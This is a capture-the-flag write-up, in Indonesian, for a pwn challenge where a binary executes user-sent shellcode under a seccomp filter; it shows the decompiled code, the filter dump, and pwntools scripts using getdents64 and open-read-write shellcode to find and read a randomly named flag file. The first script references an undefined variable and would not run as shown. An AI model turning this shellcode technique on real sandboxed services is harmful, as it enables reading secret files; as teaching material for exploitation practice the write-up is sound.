# Vault
Category: PWN

Points: 1000 PTS

Solves: 1

Challenge Description: 

    chall ramah
    nc 172.20.12.248:1338

Artifact Files:
* [chall]()
* [Dockerfile]()
* [docker-compose.yml]()

## Initial analysis
Diberikan file chall 64 bit dan dockerfilenya. Berikut decompile dari IDA
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rax
  void *v4; // rbx

  setvbuf(stream: stdin, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: nullptr, modes: 2, n: 0);
  v3 = mmap(addr: nullptr, len: 0x1000u, prot: 7, flags: 34, fd: -1, offset: 0);
  if ( v3 == (void *)-1LL )
    main_cold();
  v4 = v3;
  __printf_chk(a1: 1, a2: "Give me payload: ");
  read(fd: 0, buf: v4, nbytes: 0x1000u);
  setup_seccomp();
  ((void (*)(void))v4)();
  return 0;
}
```
Nah kalau kita liat di sini program meminta kita payload(shellcode), ada pula shellcode yang bisa kita gunakan adalah:
```
┌──(alfonkali㉿fon)-[/mnt/d/cyber/nevtik/nevcomp_2027/PWN/shellcode]
└─$ seccomp-tools dump ./chall
Give me payload: ada
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x0000003c  if (A == exit) goto 0012
 0009: 0x15 0x02 0x00 0x000000d9  if (A == getdents64) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

Dari output seccomp, hampir pasti shellcode yang perlu kita buat adalah teknik ORW(Open, Read, Write). Namun masalahnya, di Dockerfile kita mengetahui bahwa nama file flag menjadi random ketika dideploy, sehingga kita perlu mengetahui nama filenya terlebih dahulu
```
RUN random=$(openssl rand -hex 32) && echo "NevComp3.0{REDACTED}" > /home/ctf/flag-${random}.txt
```

## Solution
Solusi nya adalah kita bisa menggunakan getdents64 untuk mengetahui nama file flagnya terlebih dahulu, kemudian menjalan ORW biasa.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1338)

    return r


def main():
    r = conn()

    shellcode = shellcraft.open('./')
    shellcode += shellcraft.getdents64(3, 'rsp', 0x200)
    shellcode += shellcraft.write(1, 'rsp', 0x200)

    r.send(compiled_shellcode)
    r.interactive()


if __name__ == "__main__":
    main()

```
Output:
```
Give me payload: \xbc\x01\x17\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04..\x00\x00\x00\xbe\x01\x17\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04.\x00\x7f\x00\x00\xbf\x01\x17\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00 \x00\x08.bash_logout\x00\xc0\x01\x17\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00 \x00\x08.bashrc\x00\x00\x00\x00\x00\x00\xc1\x01\x17\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00 \x00\x08.profile\x00\xba\x8e
\xe9H\x11\x1c\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x18\x00\x08core\x00\xc2\x01\x17\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00`\x00\x08flag-8ae0f881fe758b98ef5bd3d2bff3d0e7e95019996b2847f37be2c8e97adb00c0.txt\x00V\x00\x00\xc3\x01\x17\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00 \x00\x08chall\x00\x00\x00\x00\x00\x00\x00\x00\x11\xc2\xe2\xc9\x04V\x00\x00X\xcd\xcbB\xfc\x7f\x00\x008\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xda\xee\xcbB\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xea\xee\xcbB\xfc\x7f\x00\x00,\xef\xcbB\xfc\x7f\x00\x00B\xef\xcbB\xfc\x7f\x00\x00M\xef\xcbB\xfc\x7f\x00\x00X\xef\xcbB\xfc\x7f\x00\x00e\xef\xcbB\xfc\x7f\x00\x00r\xef\xcbB\xfc\x7f\x00\x00\x88\xef\xcbB\xfc\x7f\x00\x00\xa2\xef\xcbB\xfc\x7f\x00\x00\xb6\xef\xcbB\xfc\x7f\x00\x00\xd3\xef\xcbB\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\xd0\xcfB\xfc\x7f\x00\x003\x00\x00\x00\x00\x00\x00\x00\xa0\x05\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\xff\xfb\x8b\x17\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00$        
```
Dari output tersebut, didapat nama flagnya adalah 

flag-8ae0f881fe758b98ef5bd3d2bff3d0e7e95019996b2847f37be2c8e97adb00c0.txt


Tinggal di baca aja deh flagnya dengan teknik ORW
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1338)

    return r


def main():
    r = conn()

    # shellcode = shellcraft.open('./')
    # shellcode += shellcraft.getdents64(3, 'rsp', 0x200)
    # shellcode += shellcraft.write(1, 'rsp', 0x200)

    shellcode = shellcraft.open('flag-8ae0f881fe758b98ef5bd3d2bff3d0e7e95019996b2847f37be2c8e97adb00c0.txt')
    shellcode += shellcraft.read('rax', 'rsp', 100)
    shellcode += shellcraft.write(1, 'rsp', 100)
    compiled_shellcode = asm(shellcode)

    r.send(compiled_shellcode)
    r.interactive()


if __name__ == "__main__":
    main()

```
Output:
```
[+] Opening connection to 172.20.12.248 on port 1338: Done
[*] Switching to interactive mode
Give me payload: NevComp3.0{0gw_&_0rw_sh3llc0d3_e3sy_r1ght?_099f82d7d4}
```
Flag: NevComp3.0{0gw_&_0rw_sh3llc0d3_e3sy_r1ght?_099f82d7d4}

---
[Back to home](./README.md)